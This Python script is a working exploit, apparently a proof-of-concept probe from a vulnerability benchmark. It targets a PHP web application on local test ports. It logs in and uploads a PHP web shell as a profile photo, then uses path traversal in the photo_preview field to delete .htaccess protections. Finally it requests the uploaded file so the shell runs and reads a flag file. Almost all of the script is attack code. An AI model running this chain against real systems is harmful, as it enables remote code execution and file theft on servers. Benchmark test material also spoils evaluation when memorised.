#!/usr/bin/env python3
"""Method-side executable probe: run a candidate dict against the target.
Usage: python3 seed_exec.py <candidate.json> [version]
"""
import sys, json, urllib.request, urllib.parse, time, subprocess
BASE = {
    "v0": "http://127.0.0.1:39450",
    "v1": "http://127.0.0.1:39451",
}
import argparse
import json
import os
import re
import subprocess
import sys
import time
from pathlib import Path
from urllib.parse import urljoin
import requests
PAYLOAD = "<?php echo @file_get_contents('/flag/pcb_flag.txt'); ?>"
USER, PW = "poc@pcb.local", "pocpass"
BASE = {
    "v0": "http://127.0.0.1:39450",
    "v1": "http://127.0.0.1:39451",
}
def run_probe(candidate, *, version="v1"):
    
    base = BASE[version]
    mode = candidate.get("mode", "direct") if isinstance(candidate, dict) else str(candidate)
    fname = candidate.get("filename", "pcb.php") if isinstance(candidate, dict) else "pcb.php"
    traversals = candidate.get("traversals", [".htaccess", "../.htaccess"]) if isinstance(candidate, dict) else [".htaccess", "../.htaccess"]
    result = {"version": version, "mode": mode, "filename": fname}
    try:
        s = _login(base)
        stored = _upload_photo(s, base, fname)
        result["stored_filename"] = stored
        if mode in ("htaccess_X", "htaccess_bypass"):
            # "htaccess_bypass" = the mode declared by poc/bypass_poc.py and
            # _heldout/bypass_poc.py; "htaccess_X" = the legacy literal embedded
            # in scripts/verify.sh. Same semantics as oracle.py run_probe:
            # after the .php photo lands, drive the delete-photo branch with
            # photo_preview=<traversal> to unlink uploads/**/.htaccess, then the
            # common tail below GETs /uploads/users/<f> so the shell executes.
            result["htaccess_delete"] = {t: _delete_htaccess(s, base, t) for t in traversals}
        if not stored:
            result["note"] = "photo did not land (upload rejected)"
        target = stored or fname
        fr = requests.get(f"{base}/uploads/users/{target}", timeout=20)
        result["fetch_status"] = fr.status_code
        result["fetched_body"] = fr.text[:200]
    except Exception as e:  
        result["error"] = f"{type(e).__name__}: {e}"
    return result
def _delete_htaccess(s: requests.Session, base: str, traversal: str) -> int:
    
    f = _get_account_form(s, base)
    data = _base_fields(f["csrf"], traversal)
    data["users[remove_photo]"] = "1"
    r = s.post(f["action"], data=data, timeout=25, allow_redirects=True)
    return r.status_code
def _upload_photo(s: requests.Session, base: str, fname: str) -> str:
    
    f = _get_account_form(s, base)
    data = _base_fields(f["csrf"], f["photo_preview"])
    s.post(f["action"],
           data=data,
           files={"users[photo]": (fname, PAYLOAD, "application/octet-stream")},
           timeout=25, allow_redirects=True)
    
    return _get_account_form(s, base)["photo_preview"]
def _login(base: str) -> requests.Session:
    s = requests.Session()
    r = s.get(f"{base}/index.php/login/index", timeout=20, allow_redirects=True)
    
    
    data = {"login[email]": USER, "login[password]": PW}
    token = _csrf(r.text, "login")
    if token:
        data["login[_csrf_token]"] = token
    s.post(f"{base}/index.php/login/index", data=data, timeout=20, allow_redirects=True)
    
    ma = s.get(f"{base}/index.php/myAccount/index", timeout=20, allow_redirects=True)
    if 'id="users"' not in ma.text:
        raise RuntimeError("member login failed")
    return s
def _get_account_form(s: requests.Session, base: str) -> dict:
    
    r = s.get(f"{base}/index.php/myAccount/index", timeout=20, allow_redirects=True)
    html = r.text
    m = re.search(r'id="users"[^>]*\baction="([^"]+)"', html) \
        or re.search(r'\baction="([^"]+)"[^>]*id="users"', html)
    action = urljoin(base + "/", m.group(1)) if m else f"{base}/index.php/myAccount/update"
    pm = (re.search(r'name="users\[photo_preview\]"[^>]*\bvalue="([^"]*)"', html)
          or re.search(r'\bvalue="([^"]*)"[^>]*name="users\[photo_preview\]"', html))
    return {"action": action, "csrf": _csrf(html, "users"),
            "photo_preview": pm.group(1) if pm else "", "html": html}
def _base_fields(csrf: str, photo_preview: str = "") -> dict:
    
    data = {
        "users[name]": "poc",
        "users[email]": USER,
        "users[users_group_id]": "1",
        "users[culture]": "en",
        "users[new_password]": "",
        "users[photo_preview]": photo_preview,
        "users[remove_photo]": "0",
    }
    if csrf:
        data["users[_csrf_token]"] = csrf
    return data
def _csrf(html: str, form: str) -> str:
    
    name = re.escape(form) + r"\[_csrf_token\]"
    m = (re.search(r'name="' + name + r'"[^>]*\bvalue="([^"]*)"', html)
         or re.search(r'\bvalue="([^"]*)"[^>]*name="' + name + r'"', html))
    return m.group(1) if m else ""


import os as _os_pcb
_pbt = _os_pcb.environ.get("PCB_TARGET_BASE")
if _pbt:
    for _d in ("BASE", "HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                globals()[_d][_v] = _pbt
_pt = _os_pcb.environ.get("PCB_TARGET_PORT")
if _pt:
    if "BASE" in globals() and isinstance(globals()["BASE"], dict):
        for _v in list(globals()["BASE"]):
            _val = globals()["BASE"][_v]
            if isinstance(_val, (tuple, list)):
                globals()["BASE"][_v] = (str(_val[0]), int(_pt))
            elif isinstance(_val, int) or (isinstance(_val, str) and _val.isdigit()):
                globals()["BASE"][_v] = int(_pt)
            else:
                globals()["BASE"][_v] = f"http://127.0.0.1:{int(_pt)}"
    for _d in ("HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                _old = globals()[_d][_v]
                if isinstance(_old, (tuple, list)):
                    globals()[_d][_v] = (str(_old[0]), int(_pt))
                else:
                    globals()[_d][_v] = int(_pt)

if __name__ == "__main__":
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    r = run_probe(cand, version=version)
    print(json.dumps(r, default=str))